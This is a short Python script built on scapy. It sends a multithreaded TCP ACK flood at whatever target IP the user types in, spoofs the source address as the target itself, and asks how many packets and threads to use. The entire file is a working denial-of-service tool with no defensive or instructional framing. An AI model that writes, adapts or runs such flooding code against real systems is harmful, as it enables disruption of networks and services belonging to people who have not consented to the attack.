from scapy.all import *
import os
import threading

def ACK_Flood(dstIP, dstPort, counter):
    for _ in range(counter):
        s_port = 80  
        s_eq = 1000 
        w_indow = 1000 

        IP_Packet = IP(src=dstIP, dst=dstIP)
        TCP_Packet = TCP(sport=s_port, dport=dstPort, flags="A", seq=s_eq, window=w_indow)

        send(IP_Packet/TCP_Packet, verbose=0)

def main():
    os.system("clear")
    dstIP = input("\nTarget IP: ")
    counter = int(input("How many packets do you want to send: "))
    threads_count = int(input("How many threads do you want to use: "))

    packets_per_thread = counter // threads_count
    extra_packets = counter % threads_count

    threads = []

    for i in range(threads_count):
        thread_counter = packets_per_thread + (1 if i < extra_packets else 0)
        thread = threading.Thread(target=ACK_Flood, args=(dstIP, 80, thread_counter))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("\nTotal packets sent: %i" % counter)

if __name__ == "__main__":
    main()
